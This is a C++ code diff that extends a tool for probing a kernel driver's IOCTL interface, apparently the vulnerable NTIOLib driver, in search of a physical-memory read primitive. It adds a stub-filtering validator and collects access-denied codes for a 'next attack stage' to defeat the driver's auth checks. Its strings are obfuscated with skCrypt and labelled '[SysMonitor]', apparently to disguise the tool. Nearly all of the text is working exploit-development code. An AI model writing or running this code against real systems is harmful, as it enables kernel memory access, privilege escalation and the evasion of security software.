@@ -468,6 +468,9 @@ public:
         m_ioBroken.store(false, std::memory_order_release);
         m_ioFailStreak.store(0, std::memory_order_release);
         m_armed.store(false, std::memory_order_release);
+        m_readIoctlOverride.store(0, std::memory_order_release);
+        m_readIoctlIdx.store(0, std::memory_order_release);
+        m_readShapeIdx.store(0, std::memory_order_release);
         for (auto& c : m_failLogCounts) c.store(0, std::memory_order_release);
     }
 
@@ -1480,17 +1483,50 @@ private:
         return false;
     }
 
+    // Confirms a candidate IOCTL is a real MmMapIoSpace-based read handler
+    // and not a constant-returning stub like VERSION (0xC3502004 returns
+    // 0x00000001 regardless of input, which happily passes an "ok=1
+    // returned=4" check). The stub filter requests 8 bytes at PA 0x1000
+    // (unit=4, count=2); a real read handler fills 8 bytes because it
+    // sizes the copy from unit*count, while a stub keeps returning its
+    // hardcoded 4-byte payload — the returned-count mismatch rejects it.
+    bool ValidateReadCandidate(HANDLE h, uint32_t code) {
+        struct { uint64_t pa; uint32_t unit; uint32_t count; } req = { 0x1000, 4, 2 };
+        uint8_t buf[8] = {};
+        DWORD ret = 0;
+        SetLastError(0);
+        BOOL ok = DeviceIoControl(h, code, &req, (DWORD)sizeof(req),
+                                  buf, (DWORD)sizeof(buf), &ret, nullptr);
+        if (ok == FALSE || ret != (DWORD)sizeof(buf)) return false;
+        // Second probe: same PA, different unit shape. Real read returns
+        // consistent bytes; a stub that ignores input and echoes memory
+        // from its own buffer will differ.
+        struct { uint64_t pa; uint32_t unit; uint32_t count; } req2 = { 0x1000, 2, 4 };
+        uint8_t buf2[8] = {};
+        DWORD ret2 = 0;
+        SetLastError(0);
+        BOOL ok2 = DeviceIoControl(h, code, &req2, (DWORD)sizeof(req2),
+                                   buf2, (DWORD)sizeof(buf2), &ret2, nullptr);
+        if (ok2 == FALSE || ret2 != (DWORD)sizeof(buf2)) return false;
+        // The two probes read the same PA range in different unit sizes;
+        // MmMapIoSpace + rep movs of unit*count bytes yields identical
+        // byte patterns regardless of the movs granularity.
+        return memcmp(buf, buf2, sizeof(buf)) == 0;
+    }
+
     // Broad IOCTL-code sweep. Given ARM works on 0xC350214C, VERSION works
     // on 0xC3502004, but 0xC3506104 uniformly returns STATUS_INVALID_HANDLE
     // regardless of input shape, this build routes physical-memory read
     // through a code we haven't identified. Sweep the plausible ranges
     // with a standard 16-byte NtioReadReq at PA 0x1000 and classify:
-    //   ok=1  returned=size   → REAL READ PRIMITIVE (latch and return)
+    //   ok=1  returned=size   → CANDIDATE — validate with ValidateReadCandidate
     //   err=87 / err=24       → real handler, wrong request shape
-    //   err=6                 → dead case (returns STATUS_INVALID_HANDLE)
+    //   err=6                 → dead case OR arm-gated real handler
+    //                            (both return STATUS_INVALID_HANDLE)
     //   err=1                 → not in dispatch table
     // Prints per-hit lines for the interesting classes plus a summary
-    // count, so operator can pattern-match against public NTIOLib RE.
+    // count and the full err=6 candidate list — those are the codes
+    // that need next-level attack (per-handle arm, image-name gate).
     bool ReadIoctlSweep(HANDLE h) {
         if (h == INVALID_HANDLE_VALUE) {
             printf(skCrypt("[SysMonitor] read-sweep: handle invalid, skipping\n"));
@@ -1521,9 +1557,16 @@ private:
         };
 
         int  total  = 0;
-        int  nErr1 = 0, nErr6 = 0, nErr87 = 0, nErr24 = 0, nOk = 0, nOther = 0;
+        int  nErr1 = 0, nErr6 = 0, nErr87 = 0, nErr24 = 0, nOkStub = 0, nOther = 0;
         int  hitsPrinted = 0;
         uint32_t foundCode = 0;
+
+        // Collect err=6 codes — these are candidates for the next attack
+        // stage (per-handle arm state, image-name gating, secondary
+        // unlock IOCTL). Cap at 64 to bound memory.
+        constexpr int kMaxErr6 = 64;
+        uint32_t err6Codes[kMaxErr6] = {};
+        int      err6Count = 0;
 
         for (auto& r : ranges) {
             printf(skCrypt("[SysMonitor] read-sweep range [%s] 0x%08X..0x%08X (step 4)\n"),
@@ -1543,15 +1586,28 @@ private:
                 DWORD err = GetLastError();
 
                 if (ok != FALSE && returned == sizeof(out)) {
-                    printf(skCrypt("[SysMonitor] read-sweep HIT: ioctl=0x%08X ok=1 returned=%lu value=0x%08X\n"),
-                           (unsigned)code, returned, (unsigned)out);
-                    if (!foundCode) foundCode = code;
-                    nOk++;
+                    // Passed initial ok=1 returned=4 check — but VERSION
+                    // and other constant-returning stubs also pass this.
+                    // Validate with an 8-byte probe: real reads size the
+                    // copy from unit*count, stubs keep echoing 4 bytes.
+                    bool real = ValidateReadCandidate(h, code);
+                    if (real) {
+                        printf(skCrypt("[SysMonitor] read-sweep HIT: ioctl=0x%08X (validated as real read)  value=0x%08X\n"),
+                               (unsigned)code, (unsigned)out);
+                        if (!foundCode) foundCode = code;
+                    } else {
+                        nOkStub++;
+                        printf(skCrypt("[SysMonitor] read-sweep [ioctl=0x%08X]: ok=1 but stub (constant/wrong size on 8B probe) — value=0x%08X\n"),
+                               (unsigned)code, (unsigned)out);
+                    }
                     continue;
                 }
                 switch (err) {
                 case 1:  nErr1++;  break;
-                case 6:  nErr6++;  break;
+                case 6:
+                    nErr6++;
+                    if (err6Count < kMaxErr6) err6Codes[err6Count++] = code;
+                    break;
                 case 87:
                     nErr87++;
                     if (hitsPrinted < 16) {
@@ -1580,8 +1636,22 @@ private:
             }
         }
 
-        printf(skCrypt("[SysMonitor] read-sweep summary: probed=%d err1=%d err6=%d err87=%d err24=%d ok=%d other=%d\n"),
-               total, nErr1, nErr6, nErr87, nErr24, nOk, nOther);
+        printf(skCrypt("[SysMonitor] read-sweep summary: probed=%d err1=%d err6=%d err87=%d err24=%d ok-stub=%d other=%d\n"),
+               total, nErr1, nErr6, nErr87, nErr24, nOkStub, nOther);
+
+        // Dump the full err=6 candidate list — these codes routed through
+        // the driver's dispatch and hit a case that returned STATUS_INVALID_
+        // HANDLE. Either dead cases OR real read/write handlers guarded by
+        // an auth check we haven't defeated (per-handle arm, image-name
+        // gate). Next stage: try each with alternate auth sequences.
+        if (err6Count > 0) {
+            printf(skCrypt("[SysMonitor] read-sweep err=6 codes (%d total):"), err6Count);
+            for (int i = 0; i < err6Count; i++) {
+                printf(" 0x%08X", (unsigned)err6Codes[i]);
+                if ((i & 7) == 7 && i + 1 < err6Count) printf("\n                            ");
+            }
+            printf("\n");
+        }
 
         if (foundCode) {
             m_readIoctlOverride.store(foundCode, std::memory_order_release);
